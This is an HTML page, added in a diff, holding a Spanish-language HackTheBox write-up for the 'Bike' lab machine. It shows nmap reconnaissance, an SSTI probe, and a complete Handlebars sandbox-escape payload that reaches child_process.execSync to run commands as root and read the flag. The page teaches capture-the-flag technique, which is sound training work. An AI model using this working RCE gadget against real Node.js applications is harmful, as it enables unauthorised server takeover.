@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Bike — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Bike de HackTheBox (Linux, Muy Fácil): un formulario de email refleja la entrada en una plantilla Handlebars (SSTI); un gadget que llega al constructor Function escapa la sandbox y ejecuta comandos directamente como root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/bike.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Bike — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Bike de HackTheBox (Linux, Muy Fácil): un formulario de email refleja la entrada en una plantilla Handlebars (SSTI); un gadget que llega al constructor Function escapa la sandbox y ejecuta comandos directamente como root.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/bike.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/bike.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Bike — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Bike de HackTheBox (Linux, Muy Fácil): un formulario de email refleja la entrada en una plantilla Handlebars (SSTI); un gadget que llega al constructor Function escapa la sandbox y ejecuta comandos directamente como root.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/bike.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Bike — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Bike de HackTheBox (Linux, Muy Fácil): un formulario de email refleja la entrada en una plantilla Handlebars (SSTI); un gadget que llega al constructor Function escapa la sandbox y ejecuta comandos directamente como root.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/bike.html", "image": "https://brandeiks.github.io/assets/og/bike.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/bike.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>bike</span>
+    </div>
+    <h1 class="writeup-title">BI<span>KE</span></h1>
+    <p class="writeup-subtitle">// SSTI en Handlebars → escape de sandbox → ejecución de comandos como root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-ssti">SSTI</span>
+      <span class="meta-badge badge-rce">RCE</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento y formulario</a></li>
+        <li><a href="#ssti">02 · SSTI y escape de sandbox</a></li>
+        <li><a href="#cmdref">03 · Referencia Comandos</a></li>
+        <li><a href="#glosario">04 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Bike</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">Express + Handlebars</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">formulario → <span>email reflejado</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">error de parser → <span>Handlebars</span> + ruta <code>/root/Backend</code></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">gadget <span>constructor → Function</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>execSync</span> → RCE directo</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">proceso corre como <span>root</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECONOCIMIENTO Y FORMULARIO ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento y formulario</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">RECONOCIMIENTO</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -sS -p- -n -Pn --min-rate 3000 --max-retries 1 --open 10.129.97.64">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-sS -p- -n -Pn --min-rate</span> <span class="arg">3000</span> <span class="flag">--max-retries</span> <span class="arg">1</span> <span class="flag">--open</span> <span class="arg">10.129.97.64</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>22/tcp open  ssh</div>
+        <div><span class="o-green">80/tcp open  http    (Express)</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">UN FORMULARIO QUE REFLEJA LA ENTRADA</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s http://10.129.97.64/">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">CURL</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s</span> <span class="arg">http://10.129.97.64/</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>&lt;form id="form" method="POST" action="/"&gt;</div>
+        <div>  &lt;input name="email" placeholder="E-mail"&gt;</div>
+        <div>  &lt;button type="submit" name="action" value="Submit"&gt;Submit&lt;/button&gt;</div>
+        <div>&lt;/form&gt;</div>
+        <div></div>
+        <div><span class="o-green">We will contact you at: test@test.com</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          Una landing de «próximamente» en <strong>Express</strong> con un campo que <strong>refleja</strong> lo enviado
+          es el candidato número uno a <strong>SSTI</strong> (Server-Side Template Injection).
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 SSTI Y ESCAPE DE SANDBOX ===================== -->
+    <div class="section" id="ssti">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">SSTI y escape de sandbox</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONFIRMAR EL MOTOR DE PLANTILLAS</span>
+      </div>
+      <div class="cmd-block" data-cmd="curl -s -X POST 'http://10.129.97.64/' --data-urlencode 'email={{7*7}}' --data-urlencode 'action=Submit'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SSTI PROBE</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s -X POST</span> <span class="arg">'http://10.129.97.64/'</span> --data-urlencode <span class="arg">'email={{7*7}}'</span> --data-urlencode <span class="arg">'action=Submit'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>Error: Parse error on line 1: {{7*7}}</div>
+        <div>Expecting 'ID', 'STRING', ... at Parser.parseError</div>
+        <div>(<span class="o-yellow">/root/Backend/node_modules/handlebars/...</span>)</div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// DOS DATOS CLAVE EN UN SOLO ERROR</p>
+        <p>
+          El error no es de Jinja2 (que sí evaluaría <code>7*7</code>): es de <strong>Handlebars</strong>, que no acepta
+          expresiones aritméticas en los <em>mustaches</em> y hay que atacarlo con un <em>gadget</em> distinto. Además, la
+          traza revela la ruta <code>/root/Backend</code>: <strong>la app corre como root</strong>, así que cualquier
+          RCE será directamente root.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">GADGET DE ESCAPE: CONSTRUCTOR → FUNCTION → EXECSYNC</span>
+      </div>
+      <div class="prose">
+        <p>
+          Handlebars sanitiza las expresiones normales, pero su sandbox se puede escapar navegando desde un string
+          literal hasta su <code>constructor</code> (<code>Function</code>) con <code>lookup</code>, y ejecutando el
+          código inyectado con <code>.apply</code>.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="{{#with &quot;s&quot; as |string|}}{{#with &quot;e&quot;}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub &quot;constructor&quot;)}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push &quot;return process.mainModule.require('child_process').execSync('id').toString()&quot;}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">HANDLEBARS GADGET</span>
+        <div><span class="comment"># cadena de #with que llega a String.prototype.constructor (Function)</span></div>
+        <div><span class="comment"># e inyecta: return process.mainModule.require('child_process').execSync('CMD').toString()</span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">uid=0(root) gid=0(root) groups=0(root)</span></div>
+      </div>
+      <div class="warn-box">
+        <p class="warn-box-title">// OJO CON EL PAYLOAD</p>
+        <p>
+          Handlebars interpreta <code>|</code>, <code>{</code> y <code>}</code> dentro de la plantilla: hay que evitar
+          esos caracteres en el <code>CMD</code> que se inyecta (nada de pipes ni llaves directamente).
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">LEER LA FLAG</span>
+      </div>
+      <div class="cmd-block" data-cmd="cat /root/flag.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">FLAG</span>
+        <div><span class="comment"># CMD = 'cat /root/flag.txt' dentro del mismo gadget</span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">[flag oculta]</span></div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAG</p>
+        <p>
+          <strong>[flag oculta]</strong> — única flag del reto: la aplicación corre como root y no hay
+          más usuarios con shell en <code>/etc/passwd</code>, así que no hace falta escalar privilegios.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">SSTI probe</div>
+          <div class="cmd-ref-syntax">{{7*7}}</div>
+          <div class="cmd-ref-desc">Prueba clásica para detectar inyección de plantillas; el mensaje de error (o su ausencia) delata el motor exacto.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">lookup (Handlebars)</div>
+          <div class="cmd-ref-syntax">{{lookup objeto "propiedad"}}</div>
+          <div class="cmd-ref-desc">Helper que accede a una propiedad de un objeto por su nombre, usado en el gadget para llegar al <code>constructor</code>.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">child_process.execSync</div>
+          <div class="cmd-ref-syntax">require('child_process').execSync('comando').toString()</div>
+          <div class="cmd-ref-desc">API de Node.js para ejecutar un comando del sistema de forma síncrona y recoger su salida como texto.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 04 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SSTI — Server-Side Template Injection</div>
+          <div class="glos-def">
+            Vulnerabilidad donde entrada del usuario se compila como parte de una plantilla, en lugar de insertarse como
+            dato. Según el motor, puede escalar hasta ejecución de código.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Handlebars</div>
+          <div class="glos-def">
+            Motor de plantillas lógicas (sin expresiones arbitrarias) muy usado en Node.js. Su sandbox impide evaluar
+            expresiones directamente, pero es vulnerable a <em>gadgets</em> que navegan el prototipo de JavaScript.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Escape de sandbox</div>
+          <div class="glos-def">
+            Técnica que rodea las restricciones de un entorno limitado (aquí, el motor de plantillas) accediendo a
+            objetos del lenguaje subyacente (como <code>Function</code>) a través de rutas no anticipadas.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Function constructor</div>
+          <div class="glos-def">
+            En JavaScript, <code>Function("código")</code> crea y ejecuta una función a partir de una cadena de texto —
+            equivalente a un <code>eval</code> con otra sintaxis, y objetivo habitual de los gadgets de escape.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="funnel.html"><span class="dir">← ANTERIOR</span><span class="nombre">Funnel</span></a><a class="siguiente" href="unified.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Unified</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="../facil/goodgames.html"><span class="nombre">GoodGames</span><span class="meta">hackthebox · facil · SSTI · RCE</span></a><a class="rel-card" href="unified.html"><span class="nombre">Unified</span><span class="meta">hackthebox · muy-facil · Log4Shell</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Bike · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "BIKE", "plataforma": "hackthebox", "dificultad": "muy-facil", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/bike.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
